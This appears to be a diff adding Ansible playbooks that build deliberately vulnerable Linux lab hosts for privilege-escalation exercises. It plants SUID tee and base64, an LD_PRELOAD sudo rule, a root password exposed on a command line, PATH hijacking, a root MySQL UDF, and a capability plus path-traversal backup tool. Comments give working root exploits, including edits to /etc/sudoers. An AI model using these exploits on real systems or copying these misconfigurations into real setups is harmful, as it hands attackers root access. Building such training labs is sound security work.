@@ -261,3 +261,375 @@
         mode: '0666'
         content: |
           Now that the root admin is on vacation, I have to take over their tasks. The login password for root is aim8Du7h.
+
+- name: suid allow access to write privileges
+  hosts: vuln_suid_write_privileges
+  gather_facts: true
+  remote_user: root
+  tasks:
+    - name: set the suid bit for tee
+      command: chmod u+s /usr/bin/tee
+      # echo "lowpriv ALL=(ALL) NOPASSWD: ALL" | tee -a /etc/sudoers; sudo su
+
+- name: suid allow access to read privileges
+  hosts: vuln_suid_read_privileges
+  gather_facts: true
+  remote_user: root
+  tasks:
+    - name: write root password into file
+      copy:
+        content: "aim8Du7h\n"
+        dest: "/home/lowpriv/root_password"
+        mode: "0400"
+      
+    - name: set the suid bit for base64
+      command: chmod u+s /usr/bin/base64
+      # base64 root_password | base64 -d; su
+
+- name: LD_PRELOAD enabled on sudo calls
+  hosts: vuln_ld_preload
+  gather_facts: true
+  remote_user: root
+  tasks:
+    - name: install gcc
+      apt:
+        name: gcc
+        state: present
+
+    - name: allow LD_PRELOAD in sudo
+      lineinfile:
+        path: /etc/sudoers
+        line: 'Defaults    env_keep += "LD_PRELOAD"'
+        state: present
+        validate: '/usr/sbin/visudo -cf %s'
+
+    - name: allow lowpriv to execute sudo mount
+      lineinfile:
+        path: /etc/sudoers
+        line: 'lowpriv ALL=(ALL) NOPASSWD: /bin/mount /dev/sdb1 /mnt/usb'
+        state: present
+        validate: '/usr/sbin/visudo -cf %s'
+
+    - name: allow lowpriv to execute sudo umount
+      lineinfile:
+        path: /etc/sudoers
+        line: 'lowpriv ALL=(ALL) NOPASSWD: /bin/umount /mnt/usb'
+        state: present
+        validate: '/usr/sbin/visudo -cf %s'
+        # nano exploit.c
+        # #include <unistd.h>
+        # #include <stdlib.h>
+        # void _init() {
+        #   unsetenv("LD_PRELOAD");
+        #   setgid(0);
+        #   setuid(0);
+        #   system("/bin/bash");
+        # }
+        # gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
+        # sudo LD_PRELOAD=$PWD/exploit.so /bin/mount /dev/sdb1 /mnt/usb
+
+- name: root password entered into console as parameter
+  hosts: vuln_password_in_console
+  gather_facts: true
+  remote_user: root
+  tasks:
+    - name: install gcc
+      apt:
+        name: gcc
+        state: present
+
+    - name: install htop
+      apt:
+        name: htop
+        state: present
+
+    - name: copy source code of fake mysql program
+      copy:
+        dest: /root/fake_mysql.c
+        content: |
+          #include <unistd.h>
+          int main() {
+            while(1) { sleep(1); }
+          }
+
+    - name: compile mysql program
+      command: gcc /root/fake_mysql.c -o /root/mysql
+
+    - name: create systemd task that calls mysql and leaks the root password
+      copy:
+          dest: /etc/systemd/system/mysql.service
+          content: |
+            [Unit]
+            Description=Fake MySQL process
+            After=network.target
+
+            [Service]
+            ExecStart=/root/mysql -u root -p aim8Du7h
+            Restart=always
+            User=root
+
+            [Install]
+            WantedBy=multi-user.target
+    
+    - name: restart systemctl
+      command: systemctl daemon-reload
+
+    - name: start the fake mysql service
+      systemd:
+        name: mysql
+        enabled: yes
+        state: started
+        # htop; su
+      
+- name: suid binary does system call without absolute path
+  hosts: vuln_path
+  gather_facts: true
+  remote_user: root
+  tasks:
+    - name: install gcc
+      apt:
+        name: gcc
+        state: present
+
+    - name: copy source code of vulnerable suid program
+      copy:
+        dest: /home/lowpriv/elevated_lsof.c
+        content: |
+          #include <stdlib.h>
+          #include <unistd.h>
+          int main() {
+            setuid(0);
+            setgid(0);
+            system("lsof");
+          }
+
+    - name: compile elevated_lsof
+      command: gcc /home/lowpriv/elevated_lsof.c -o /home/lowpriv/elevated_lsof
+
+    - name: set the suid bit on the binary
+      command: chmod u+s /home/lowpriv/elevated_lsof
+      # cp /bin/bash lsof; export PATH="$HOME:$PATH"; ./elevated_lsof
+
+- name: mysql is running as root and allows file reads/writes from/to every direction
+  hosts: vuln_mysql_misconfig
+  gather_facts: true
+  remote_user: root
+  tasks:
+    - name: install gcc, libaio1 and libncurses6
+      apt:
+        name:
+          - gcc
+          - libaio1
+          - libncurses6
+        state: present
+
+    - name: download mysql
+      command: >
+        wget -O /tmp/mysql.tar.xz 
+        https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-8.0.36-linux-glibc2.28-x86_64.tar.xz
+      args:
+        creates: /tmp/mysql.tar.xz
+
+    - name: create mysql directory
+      file:
+        path: /var/mysql
+        state: directory
+
+    - name: check if mysql data directory already initialized
+      stat:
+        path: /var/mysql/data/mysql
+      register: mysql_data_dir
+
+    - name: extract mysql
+      unarchive:
+        src: /tmp/mysql.tar.xz
+        dest: /var/mysql
+        remote_src: yes
+        extra_opts: [--strip-components=1]
+      when: not mysql_data_dir.stat.exists
+
+    - name: initialize mysql
+      command: /var/mysql/bin/mysqld --initialize-insecure --basedir=/var/mysql --datadir=/var/mysql/data
+      when: not mysql_data_dir.stat.exists
+
+    - name: create mysql systemd service
+      copy:
+        dest: /etc/systemd/system/mysql.service
+        content: |
+          [Unit]
+          Description=Custom MySQL Server (Unsafe)
+          After=network.target
+
+          [Service]
+          Type=simple
+          ExecStart=/var/mysql/bin/mysqld --basedir=/var/mysql --datadir=/var/mysql/data --user=root --secure-file-priv=""
+          Restart=on-failure
+
+          [Install]
+          WantedBy=multi-user.target
+
+    - name: restart systemctl
+      command: systemctl daemon-reload
+
+    - name: start the mysql service
+      systemd:
+        name: mysql
+        enabled: yes
+        state: started
+        # nano exploit.c
+        #include <mysql.h>
+        # int sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
+        #     return 0;
+        # }
+        # void sys_exec_deinit(UDF_INIT *initid) {}
+        # long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
+        #     return system(args->args[0]);
+        # }
+        # gcc -Wall -fPIC -shared exploit.c -o exploit.so -I/var/mysql/include
+        # /var/mysql/bin/mysql -u root
+        # SELECT LOAD_FILE('/home/lowpriv/exploit.so') INTO DUMPFILE '/var/mysql/lib/plugin/exploit.so';
+        # CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'exploit.so';
+        # SELECT sys_exec("echo 'lowpriv ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers");
+        # exit;
+        # sudo su
+
+- name: backup tool with misconfigured capabilities and path traversal
+  hosts: vuln_capabilities
+  gather_facts: true
+  remote_user: root
+
+  vars:
+    log_dirs:
+      - system
+      - web
+      - database
+      - serial
+    # Amount of random log files per directory
+    log_count: 4
+
+  tasks:
+    - name: create user apache (system user, no login)
+      user:
+        name: apache
+        system: yes
+        shell: /usr/sbin/nologin
+        create_home: yes
+        home: /home/apache
+    
+    - name: restrict apache home permissions
+      file:
+        path: /home/apache
+        mode: '0700'
+
+    - name: create required log directories
+      file:
+        path: "/home/apache/logs/{{ item }}"
+        state: directory
+        owner: apache
+        group: apache
+        mode: '0755'
+      loop: "{{ log_dirs }}"
+
+    - name: create multiple random log files in each directory
+      copy:
+        dest: "/home/apache/logs/{{ item.0 }}/{{ item.0 }}{{ item.1 }}.log"
+        content: "Random log content for {{ item.0 }}{{ item.1 }}\n"
+        owner: apache
+        group: apache
+        mode: '0644'
+      loop: "{{ log_dirs | product(range(1, log_count + 1) | list) | list }}"
+      loop_control:
+        label: "{{ item.0 }}/{{ item.0 }}{{ item.1 }}.log"
+
+    - name: install gcc, libzip-dev, zip/unzip
+      apt:
+        name: 
+          - gcc
+          - libzip-dev
+          - zip
+          - unzip
+        state: present
+
+    - name: copy source code of vulnerable backup tool
+      copy:
+        dest: /home/lowpriv/backup_tool.c
+        content: |
+          #include <zip.h>
+          #include <stdio.h>
+          #include <dirent.h>
+          #include <sys/stat.h>
+          #include <string.h>
+
+          void add_dir(zip_t *archive, const char *base_path, const char *rel_path) {
+              char full_path[4096];
+              snprintf(full_path, sizeof(full_path), "%s/%s", base_path, rel_path);
+              struct stat st;
+              stat(full_path, &st);
+              if (S_ISDIR(st.st_mode)) {
+                  DIR *d = opendir(full_path);
+                  struct dirent *entry;
+                  while ((entry = readdir(d))) {
+                      if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+                          continue;
+                      char child_rel[4096];
+                      if (strlen(rel_path) == 0)
+                          snprintf(child_rel, sizeof(child_rel), "%s", entry->d_name);
+                      else
+                          snprintf(child_rel, sizeof(child_rel), "%s/%s", rel_path, entry->d_name);
+
+                      add_dir(archive, base_path, child_rel);
+                  }
+                  closedir(d);
+              } else {
+                  zip_source_t *source = zip_source_file(archive, full_path, 0, 0);
+                  zip_file_add(archive, rel_path, source, ZIP_FL_OVERWRITE | ZIP_FL_ENC_UTF_8);
+              }
+          }
+
+          void removeSubstring(char *str, const char *toRemove) {
+              size_t len = strlen(toRemove);
+              if (len == 0) return;
+              char *read = str, *write = str;
+              while (*read) {
+                  if (strncmp(read, toRemove, len) == 0) {
+                      read += len;
+                  } else {
+                      *write++ = *read++;
+                  }
+              }
+              *write = '\0';
+          }
+
+          int main(int argc, char **argv) {
+              if (argc != 3) {
+                printf("USAGE: %s {database|serial|system|web} <output_file>\n", argv[0]);
+                return 1;
+              }
+              const char *user_str = argv[1];
+              const char *out_zip = argv[2];
+              char base_dir[4096];
+              snprintf(base_dir, sizeof(base_dir), "/home/apache/logs/%s", user_str);
+              removeSubstring(base_dir, "../");
+              int err = 0;
+              printf("Zipping %s into %s ...\n", base_dir, out_zip);
+              zip_t *archive = zip_open(out_zip, ZIP_CREATE | ZIP_TRUNCATE, &err);
+              add_dir(archive, base_dir, "");
+              zip_close(archive);
+              printf("Done!\n");
+              return 0;
+          }
+
+    - name: compile backup tool
+      command: gcc -std=c11 /home/lowpriv/backup_tool.c -lzip -o /home/lowpriv/backup_tool
+
+    - name: set execution rights
+      command: chmod a+x /home/lowpriv/backup_tool
+
+    - name: set capability
+      command: setcap cap_dac_read_search+ep /home/lowpriv/backup_tool
+
+    - name: write root password into file for simplicity
+      copy:
+        dest: /root/root_password.txt
+        content: "aim8Du7h\n"
+        # ./backup_tool ..././..././..././root root.zip; unzip root.zip -d root; cat root/root_password.txt; su
